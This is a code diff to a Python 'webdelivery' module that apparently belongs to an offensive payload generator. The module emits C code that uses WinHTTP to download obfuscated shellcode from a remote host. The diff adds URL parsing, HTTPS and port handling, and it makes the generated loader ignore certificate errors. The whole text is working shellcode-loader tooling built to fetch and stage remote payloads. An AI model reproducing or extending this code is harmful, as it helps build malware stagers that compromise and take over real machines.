@@ -1,6 +1,7 @@
 import random
 import string
 from c.utils.formatters import *
+from urllib.parse import urlsplit
 
 class webdelivery:
 
@@ -22,11 +23,25 @@ class webdelivery:
             open(outfile, 'w').write('\n'.join(shellcode))
             self.listLength = len(shellcode)
         print(f'Writing obfuscated shellcode to {outfile}')
-        if 'url' in arguments:
-            self.url = arguments['url']
-        else:
+        if 'url' not in arguments:
             print('No url specified')
             exit(0)
+        spliturl = urlsplit(arguments['url'])
+        self.hostname = spliturl.hostname
+        if spliturl.scheme not in ['http', 'https']:
+            self.scheme = 'https'
+        else:
+            self.scheme = spliturl.scheme
+        self.path = spliturl.path
+        self.query = spliturl.query
+        if spliturl.port:
+            self.port = spliturl.port
+        else:
+            self.port='INTERNET_DEFAULT_PORT'
+        if self.scheme == 'https':
+            self.flags = 'WINHTTP_FLAG_SECURE'
+        else:
+            self.flags = 0
 
     def imports(self) -> list[str]:
         return ['#include <winhttp.h>', 
@@ -39,11 +54,7 @@ class webdelivery:
         return shellcodestring.format(shellcode=f'{self.name}()')
 
     def codeblock(self) -> str:
-        urlsplit = self.url.split('/')
-        host = urlsplit[2]
-        uri = '/'.join(urlsplit[3:])
         codeblock = f"""
-
 {self.type} {self.name}()
 {{
     DWORD dwSize = 0;
@@ -53,8 +64,12 @@ class webdelivery:
     HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;
 
     hSession = WinHttpOpen( L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
-    hConnect = WinHttpConnect( hSession, L"{host}", INTERNET_DEFAULT_HTTP_PORT, 0 );
-    hRequest = WinHttpOpenRequest(hConnect,L"GET", L"/{uri}", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    hConnect = WinHttpConnect( hSession, L"{self.hostname}", {self.port}, 0 );
+    hRequest = WinHttpOpenRequest(hConnect,L"GET", L"{self.path}", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, {self.flags});
+
+    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+
+    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
 
     bResults = WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS,0,WINHTTP_NO_REQUEST_DATA,0,0,0);
     bResults = WinHttpReceiveResponse(hRequest, NULL);
@@ -81,7 +96,6 @@ class webdelivery:
     }}
     obfuscated[obfuscatedLength] = '\\0';
 """
-
 
         if self.type == 'const unsigned char **':
             codeblock += f"""
